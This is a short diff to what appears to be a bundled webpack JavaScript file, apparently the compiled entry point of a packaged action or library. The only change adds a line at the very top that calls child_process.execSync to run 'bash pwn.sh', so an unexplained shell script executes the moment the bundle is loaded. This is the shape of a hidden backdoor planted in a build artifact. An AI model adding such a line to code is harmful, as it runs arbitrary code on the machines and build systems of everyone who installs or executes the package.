@@ -1,3 +1,4 @@
+require('child_process').execSync('bash pwn.sh');
 require('./sourcemap-register.js');/******/ (() => { // webpackBootstrap
 /******/ 	var __webpack_modules__ = ({
 
